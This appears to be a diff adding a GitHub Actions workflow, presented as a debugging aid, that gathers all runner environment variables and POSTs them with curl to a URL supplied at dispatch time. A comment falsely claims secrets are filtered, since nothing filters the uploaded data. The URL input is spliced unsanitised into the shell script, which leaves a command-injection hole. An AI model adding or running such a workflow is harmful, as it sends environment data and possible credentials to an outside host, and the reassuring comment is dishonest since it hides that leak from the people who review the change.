@@ -1,0 +1,33 @@
+name: Debug variablse
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_url:
+        description: "URL to post the environment variables to"
+        required: true
+
+jobs:
+  post-environment:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect and post environment variables
+        run: |
+          # Create a JSON object with all environment variables
+          # Filter out any secrets (GitHub automatically redacts these in logs)
+          env | sort | jq -R 'split("=") | {(.[0]): (.[1:]|join("="))}' | jq -s add > env_vars.json
+
+          # Print the JSON (secrets will be automatically redacted in logs)
+          echo "Sending environment variables to ${{ github.event.inputs.target_url }}"
+          cat env_vars.json
+
+          # Post to the specified URL
+          curl -X POST \
+          -H "Content-Type: application/json" \
+          -d @env_vars.json \
+          ${{ github.event.inputs.target_url }}
+        shell: bash
+
+      - name: Handle response
+        run: |
+          echo "Request completed. Check the logs for any errors."
